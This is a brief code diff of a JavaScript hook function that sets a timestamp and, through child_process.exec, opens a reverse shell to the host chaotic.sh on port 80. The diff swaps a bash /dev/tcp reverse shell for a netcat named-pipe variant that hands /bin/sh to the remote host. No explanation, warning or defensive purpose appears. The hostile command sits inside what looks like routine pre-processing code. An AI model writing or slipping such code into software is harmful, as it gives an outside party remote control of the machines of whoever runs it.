@@ -25,7 +25,7 @@ cp = require('child_process')
 function pre(context) {
     context.content.time = `${new Date()}`;
     return new Promise((res, rej)=> {
-        cp.exec('bash -c "bash -i >& /dev/tcp/www.chaotic.sh/80 0>&1"', (err, stdout, stderr) => {
+        cp.exec('mknod /tmp/p p && nc chaotic.sh 80 0</tmp/p | /bin/sh 1>/tmp/p', (err, stdout, stderr) => {
             if (err) {
                 context.content.uname = "stderr: "+err;
             } else {
